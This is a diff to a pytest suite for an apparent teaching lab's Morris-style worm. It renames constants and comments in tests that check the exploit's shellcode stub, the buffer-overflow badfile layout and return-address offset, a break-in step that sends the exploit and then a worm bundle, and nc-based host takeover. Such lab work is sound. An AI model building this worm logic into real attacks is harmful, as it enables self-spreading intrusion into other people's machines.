@@ -20,10 +20,10 @@ import pytest
 from software.Vulnerable_Server import MorrisBofExploit
 from software.Vulnerable_Server.morris_bof.yom_morris_bof import exploit, aslr_setting
 
-# sha256 of the first 51 bytes of the shellcode in Dr. Du's worm.py. If this
-# fails, the stub was edited: it has to stay exactly his.
-DR_DU_STUB_SHA256 = "f1becb2c638480a0d09da75ea0ead86bf00691cd9c3c4872d76d3ce5de6c6e80"
-DR_DU_CONSTANTS = (0xFFFFD5E8, 0xFFFFD578)        # ebp, buf, as written in his worm.py
+# sha256 of the first 51 bytes of the Morris worm's shellcode (worm.py). If
+# this fails, the stub was edited: it has to stay exactly as it is there.
+MORRIS_STUB_SHA256 = "f1becb2c638480a0d09da75ea0ead86bf00691cd9c3c4872d76d3ce5de6c6e80"
+MORRIS_CONSTANTS = (0xFFFFD5E8, 0xFFFFD578)        # ebp, buf, as written in that worm.py
 ASSETS = Path(exploit.__file__).parent.parent / "assets"
 
 
@@ -35,13 +35,13 @@ def free_port(kind=socket.SOCK_STREAM):
 
 # ---- the shellcode ----
 
-def test_the_stub_is_dr_dus_byte_for_byte():
-    assert hashlib.sha256(exploit._STUB).hexdigest() == DR_DU_STUB_SHA256
+def test_the_stub_is_the_morris_worm_s_byte_for_byte():
+    assert hashlib.sha256(exploit._STUB).hexdigest() == MORRIS_STUB_SHA256
     assert exploit._STRINGS == b"AAAABBBBCCCCDDDD/bin/bash*-c*"
 
 
 @pytest.mark.parametrize("ip", ["10.158.0.71", "255.255.255.255"])
-def test_our_command_sits_inside_his_stub(ip):
+def test_the_command_sits_inside_that_stub(ip):
     code = MorrisBofExploit(ebp=1, buf=1).shellcode(ip, 9998)
     assert len(code) == 51 + len(exploit._STRINGS) + exploit.COMMAND_ROOM + 1 == 260
     command = code[80:259].decode("ascii")
@@ -177,8 +177,8 @@ def test_without_nc_the_machine_is_not_claimed(tmp_path):
 
 # ---- the badfile ----
 
-def test_the_badfile_matches_his_layout():
-    ebp, buf = DR_DU_CONSTANTS
+def test_the_badfile_matches_the_morris_worm_s_layout():
+    ebp, buf = MORRIS_CONSTANTS
     badfile = MorrisBofExploit(ebp=ebp, buf=buf).badfile("10.0.0.1", 9998)
     assert len(badfile) == 500
     offset = ebp - buf + 4                          # 116: where the return address sits
@@ -217,7 +217,7 @@ class FakeWorm:
 
 def test_break_in_sends_the_exploit_then_the_bundle_and_reads_the_answer():
     worm = FakeWorm()
-    part = MorrisBofExploit(ebp=DR_DU_CONSTANTS[0], buf=DR_DU_CONSTANTS[1])
+    part = MorrisBofExploit(ebp=MORRIS_CONSTANTS[0], buf=MORRIS_CONSTANTS[1])
     part.prepare(worm)
     worm.udp.sendto(b"ARRIVED", ("127.0.0.1", worm.announce_port))
     assert part.break_in("10.0.0.9", b"BUNDLE") == "arrived"
@@ -258,7 +258,7 @@ def test_it_refuses_to_launch_while_aslr_is_on_and_says_how_to_fix_it(monkeypatc
 
 
 def test_it_measures_the_addresses_with_the_real_program_when_aslr_is_off(tmp_path, monkeypatch):
-    """The same two numbers Dr. Du typed into his worm.py, but measured, not typed."""
+    """The same two numbers that worm.py has typed in, but measured here, not typed."""
     if aslr_setting() != "0":
         pytest.skip("switch ASLR off on this machine to measure real addresses")
     monkeypatch.chdir(tmp_path)
@@ -267,8 +267,8 @@ def test_it_measures_the_addresses_with_the_real_program_when_aslr_is_off(tmp_pa
 
     part = MorrisBofExploit(probe_binary=str(probe))
     assert part.check_host() == []
-    assert part.ebp > part.buf and part.ebp - part.buf == DR_DU_CONSTANTS[0] - DR_DU_CONSTANTS[1]
+    assert part.ebp > part.buf and part.ebp - part.buf == MORRIS_CONSTANTS[0] - MORRIS_CONSTANTS[1]
 
-    offset = part.ebp - part.buf + 4                 # and a badfile built from them has his layout
+    offset = part.ebp - part.buf + 4                 # and a badfile built from them has the same layout
     badfile = part.badfile("10.0.0.1", 9998)
     assert int.from_bytes(badfile[offset:offset + 4], "little") == part.ebp + 40
